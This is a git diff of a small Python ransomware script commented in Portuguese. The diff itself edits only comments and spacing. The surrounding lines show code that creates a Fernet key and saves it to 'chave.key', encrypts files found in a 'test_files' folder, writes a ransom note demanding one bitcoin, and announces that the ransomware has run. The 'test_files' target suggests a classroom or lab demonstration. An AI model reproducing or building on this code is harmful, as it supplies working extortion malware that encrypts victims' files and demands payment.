@@ -6,10 +6,10 @@ def gerar_chave():  # Gera uma chave Fernet (usada por cryptography.Fernet) e sa
     with open("chave.key", "wb") as chave_file:
         chave_file.write(chave)
 
-def carregar_chave():
+def carregar_chave(): # Abre 'chave.key' em modo binário e retorna seu conteúdo (bytes).
     return open("chave.key", "rb").read()
 
-def criptografar_arquivo(arquivo, chave):     # Inicializa o objeto de cifra com a chave fornecida 
+def criptografar_arquivo(arquivo, chave):  # Inicializa o objeto de cifra com a chave fornecida 
     with open(arquivo, "rb") as file:
         dados = file.read()
     dados_encriptados = f.encrypt(dados)
@@ -31,7 +31,7 @@ def criar_mensagem_resgate(): # Mensagem posteriormente de solicitação do paga
         f.write("Envie 1 bitcoin!\n")
         f.write("Enviaremos a chave!\n")
 
-def main(): # Função principal:  execução  
+def main(): # Função principal : execução  
     gerar_chave()
     chave = carregar_chave()
     arquivos = encontrar_arquivos("test_files")
@@ -40,5 +40,5 @@ def main(): # Função principal:  execução
     criar_mensagem_resgate()
     print("Ransomware executado! Arquivos criptografados!")
 
-if __name__ == "__main__":
+if __name__ == "__main__":  # Define o ponto de execução do script
     main()
